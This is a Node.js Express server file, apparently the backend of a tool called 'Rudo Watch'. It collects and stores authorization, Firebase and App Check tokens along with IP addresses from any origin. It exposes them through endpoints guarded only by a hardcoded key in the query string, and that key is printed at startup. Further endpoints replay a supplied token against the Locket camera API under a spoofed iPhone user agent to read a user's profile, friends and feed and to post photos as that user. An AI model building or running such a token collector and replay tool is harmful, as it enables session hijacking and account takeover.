const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage (Render có read-only filesystem)
let logsData = [];

// Hàm đọc logs
const readLogs = () => logsData;

// Hàm ghi logs
const writeLogs = (logs) => {
  logsData = logs;
};

// API endpoint nhận log
app.post('/logs', (req, res) => {
  try {
    const { 
      app: appName, 
      authorization, 
      firebaseToken, 
      appCheck, 
      userAgent,
      timestamp 
    } = req.body;
    
    // Lấy IP thực từ request
    const realIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.ip;

    const logEntry = {
      id: Date.now(),
      timestamp: timestamp || new Date().toISOString(),
      app: appName || 'Unknown',
      authorization: authorization || null,
      firebaseToken: firebaseToken || null,
      appCheck: appCheck || null,
      userAgent: userAgent || req.headers['user-agent'] || null,
      ip: realIP
    };

    // Đọc logs hiện tại và thêm mới
    const logs = readLogs();
    logs.push(logEntry);
    writeLogs(logs);

    console.log(`[LOG] New entry from ${appName} - IP: ${realIP}`);

    res.status(200).json({ 
      success: true, 
      message: 'Log saved successfully',
      id: logEntry.id 
    });

  } catch (error) {
    console.error('[ERROR]', error.message);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to save log' 
    });
  }
});

// API endpoint xem logs (bảo mật bằng secret key)
app.get('/logs', (req, res) => {
  const secretKey = req.query.key;
  
  // Thay đổi secret key này
  if (secretKey !== 'ductoandev_secret_2026') {
    return res.status(401).json({ 
      success: false, 
      message: 'Unauthorized' 
    });
  }

  const logs = readLogs();
  res.json({
    success: true,
    total: logs.length,
    logs: logs
  });
});

// API endpoint xóa logs
app.delete('/logs', (req, res) => {
  const secretKey = req.query.key;
  
  if (secretKey !== 'ductoandev_secret_2026') {
    return res.status(401).json({ 
      success: false, 
      message: 'Unauthorized' 
    });
  }

  writeLogs([]);
  res.json({
    success: true,
    message: 'All logs cleared'
  });
});

// Health check
app.get('/', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Rudo Watch Backend is running',
    version: '1.0.0'
  });
});

// ═══════════════════════════════════════════════════════════════
// 🔐 LOCKET LOGIN TOOL - Đăng nhập bằng Authorization token
// ═══════════════════════════════════════════════════════════════

// Lấy thông tin user từ Locket
app.post('/locket/login', async (req, res) => {
  try {
    const { authorization } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    // Gọi Locket API để lấy thông tin user
    const response = await fetch('https://api.locketcamera.com/getUser', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({})
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        message: 'Login successful',
        user: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Login failed',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET LOGIN ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// Gửi ảnh lên Locket
app.post('/locket/send', async (req, res) => {
  try {
    const { authorization, imageUrl, caption, friends } = req.body;
    
    if (!authorization || !imageUrl) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization or imageUrl'
      });
    }

    // Gọi Locket API để gửi ảnh
    const response = await fetch('https://api.locketcamera.com/postMomentV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({
        data: {
          thumbnail_url: imageUrl,
          media_url: imageUrl,
          caption: caption || '',
          sent_to_all: friends ? false : true,
          recipients: friends || []
        }
      })
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        message: 'Photo sent successfully',
        result: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to send photo',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET SEND ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to send photo',
      error: error.message
    });
  }
});

// Lấy danh sách bạn bè
app.post('/locket/friends', async (req, res) => {
  try {
    const { authorization } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    const response = await fetch('https://api.locketcamera.com/getFriendsV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({})
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        friends: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to get friends',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET FRIENDS ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to get friends',
      error: error.message
    });
  }
});

// Lấy feed (ảnh từ bạn bè)
app.post('/locket/feed', async (req, res) => {
  try {
    const { authorization } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    const response = await fetch('https://api.locketcamera.com/getLatestMomentsV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({})
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        feed: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to get feed',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET FEED ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to get feed',
      error: error.message
    });
  }
});

// Start server
const HOST = '0.0.0.0';
app.listen(PORT, HOST, () => {
  console.log(`Server running on ${HOST}:${PORT}`);
  console.log(`Logs endpoint: POST /logs`);
  console.log(`View logs: GET /logs?key=ductoandev_secret_2026`);
});
